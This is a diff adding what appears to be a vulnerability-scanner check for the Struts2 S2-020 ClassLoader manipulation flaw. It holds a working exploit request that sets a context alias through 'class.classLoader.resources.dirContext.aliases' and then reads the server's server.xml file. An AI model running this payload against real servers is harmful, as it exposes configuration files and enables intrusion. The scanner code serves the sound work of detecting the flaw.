@@ -1,0 +1,118 @@
+#include helpers.inc;
+#include string_helpers.inc;
+#include os_detection.inc;
+#include static_files_extensions.inc;
+// files to be tested
+var files = new Array();
+var lastJob = null;
+var vulnCount = 0;
+// **************************************************************************************							 
+function alert(vxml, setAliasURI)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = lastJob.uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(lastJob);
+	
+	ri.details = "A context alias was set with a request to : [dark]" + setAliasURI + "[/dark][break]";
+	ri.details = ri.details + "This alias allows us to read any file from the server. In this case the [dark]server.xml[/dark] file was read. [break]File contents: [break]";
+	ri.details = ri.details + "[pre]" + lastJob.response.body.trunc(1024) + "[/pre]";
+		
+	AddReportItem(ri);	
+}
+function setAlias(uri, alias)
+{
+	lastJob = new THTTPJob();
+	lastJob.verb = "GET";
+	lastJob.url  = scanURL;	
+	lastJob.uri  = uri + "?class.classLoader.resources.dirContext.aliases=/" + alias + "%3Dconf/";
+	lastJob.execute();
+	
+	if (!lastJob.wasError && !lastJob.notFound) return 1;
+	else return 0;
+}
+function confirmVuln(uri, alias)
+{
+	lastJob = new THTTPJob();
+	lastJob.verb = "GET";
+	lastJob.url  = scanURL;	
+	lastJob.uri  = uri + alias + "/server.xml";
+	lastJob.execute();
+	
+	if (!lastJob.wasError && !lastJob.notFound && lastJob.response.body.indexOf("<Server") != -1) 
+	{return lastJob.response.body;}
+	else return 0;
+}
+/***********************************************************************************/
+function testVulnOnFile(uri)
+{	
+	var parts = uri.split("/");
+	var jarURI = "/";
+	
+	if (parts.length > 1) {
+		jarURI = "/" + parts[1] + "/";
+	}
+	
+	// step 0. alias 
+	var alias = randStr(8);
+	
+	// step 1. set alias	
+	if (setAlias(uri, alias))
+	{
+		var setAliasURI = lastJob.uri;
+		
+		// step 3. confirm vulnerability
+		var resp = confirmVuln(jarURI, alias);
+		if (resp)
+		{
+			alert('Struts2_ClassLoader_Manipulation_S2_020.xml', setAliasURI);
+			vulnCount = vulnCount + 1;
+		}
+	}	
+}
+/***********************************************************************************/
+function prepareFilesToBeTested(list)
+{	
+	for (var i=0;i<list.count; i++){	
+		var sf = list.getFile(i);		
+		
+		if(!sf.notFound && !sf.ignored && sf.scanSiteFile && sf.isFile)
+		{
+			if (sf.Name.endsWith(".action") || sf.Name.endsWith(".do") || sf.Name.endsWith(".page")) 
+			{
+				if (files.length < 50)
+					files.push(sf.fullPath);
+			}					
+		}	
+	}	
+	
+	// if no .action and so on files were found, add the first non-static files if Java was detected.
+	if (files.length < 25 && isJava) {
+		for (var i=0;i<list.count; i++){	
+			var sf = list.getFile(i);		
+			
+			if(!sf.notFound && !sf.ignored && sf.scanSiteFile && sf.isFile)
+			{
+				if (!isStaticExtension(getFileExt(sf.name)))
+				{
+					if (files.length < 50)
+						files.push(sf.fullPath);
+				}					
+			}	
+		}		
+	}	
+}
+/***********************************************************************************/
+/* main entry point */
+var list = getNewFiles(0);
+prepareFilesToBeTested(list);
+if (files.length > 0) 
+{
+	for (var i=0; i<files.length; i++)
+	{
+	  // don't test on all files (stop after 2 vulnerable action files).
+		if (vulnCount < 2)
+			testVulnOnFile(files[i]);
+	}
+}
